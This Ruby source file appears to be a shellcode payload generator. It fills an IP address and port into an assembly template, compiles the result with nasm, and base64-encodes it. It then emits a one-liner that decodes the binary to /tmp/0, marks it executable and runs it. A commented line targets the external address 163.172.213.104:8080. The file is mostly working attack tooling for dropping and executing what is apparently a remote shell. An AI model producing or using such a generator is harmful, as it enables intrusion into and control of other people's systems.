require "ipaddr"
require 'base64'
require 'securerandom'

class Impy
    def initialize()
        @filename = "shell.asm"
        @asm = File.open(@filename, "r").read()
        @ip = "127.0.0.1"
        @port = "4444"
    end

    def hexFormatIp(ip)
        ipArr = Array.new

        for i in 0 .. 3
            current = ip.split(".")[i]
            ipArr.push "#{current.to_i.to_s(16).rjust(2, '0').scan(/.{1,2}/).join}"
        end

        endian = ipArr.join.scan(/(..)(..)(..)(..)/).map(&:reverse).join

        final = ""

        if endian[0] == "0"
            final = "0x#{endian[1..-1]}"
        else
            final = "0x#{endian}"
        end

        return final
    end

    def hexFormatPort(port)
        port = port.to_i.to_s(16).rjust(4, '0').scan(/.{1,2}/)
 
        hexFormatted = Array.new

        for element in port
            hexFormatted.push "#{element}" # \x format
        end

        final = ""
        endian = hexFormatted.reverse.join

        if endian[0] == "0"
            final = "0x#{endian[1..-1]}"
        else
            final = "0x#{endian}"
        end
        
        return final
    end

    def modifyASM(ip, port)
        ip = hexFormatIp(ip)
        port = hexFormatPort(port)

        @asm.gsub!("IPADDRESS", ip)
        @asm.gsub!("PORTNUMBER", port)
    end

    def compileToBase64()
        # Generate random identifier to avoid colissions
        random_str = SecureRandom.hex

        # Write ASM to tmp file
        tmp = File.open(".tmp.#{random_str}", "w")
        @asm.split("\n").each do |line|
            tmp.write(line+"\n")
        end
        tmp.close()

        # Compile ASM to Binary
        `nasm -o .tmp.compiled.#{random_str} .tmp.#{random_str}`

        # Read binary and convert to base64
        base64 = Base64.strict_encode64(File.open(".tmp.compiled.#{random_str}", "rb").read)
        
        File.delete("./.tmp.#{random_str}") if File.exist?("./.tmp.#{random_str}")
        File.delete("./.tmp.compiled.#{random_str}") if File.exist?("./.tmp.compiled.#{random_str}")

        return base64
    end

    def genPayload(ip, port)
        output = ""

        good_ip = false
        good_port = false

        begin
            test = IPAddr.new(ip)
            good_ip = true
        rescue => e
            output += "Something went wrong with IP, #{e.to_s}\n"
        end

        begin
            if port.to_i > 0 and port.to_i < 65535
                good_port = true
            else
                output += "Port is invalid\n"
            end
        rescue => e
            output += "Something went wrong with port #{e.to_}\n"
        end

        if good_ip and good_port
            begin
                modifyASM(ip, port)
                base64 = compileToBase64()
                output += "base64 -d <<< #{base64} > /tmp/0; chmod +x /tmp/0; /tmp/0\n"
            rescue => e
                output += "Something went wrong. #{e.to_s}\n"
            end 
        else
            output += "IP or Port is bad. Please check it.\n"
        end

        return output
    end

end

#impy = Impy.new()
#puts impy.genPayload("163.172.213.104", "8080")